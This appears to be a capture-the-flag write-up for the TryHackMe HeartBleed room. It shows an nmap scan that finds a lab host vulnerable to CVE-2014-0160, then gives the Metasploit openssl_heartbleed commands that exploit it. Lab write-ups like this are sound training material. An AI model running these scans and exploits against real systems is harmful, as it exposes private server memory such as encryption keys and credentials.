# [HeartBleed](https://tryhackme.com/room/heartbleed)

## Task 2 - Protecting Data in Transit

Check if the IP is vulnerable:
```shell
nmap -p 443 --script ssl-heartbleed <TARGET_IP>
```

Output will look like:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-06 09:38 UTC
Nmap scan report for ip-10-129-68-248.eu-west-3.compute.internal (10.129.68.248)
Host is up (0.00067s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 
MAC Address: 0A:A8:B0:50:0B:53 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

Exploit via Metasploit:
```shell
msfconsole
```

Commands:
```
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS <TARGET_IP>
set verbose true
run
```
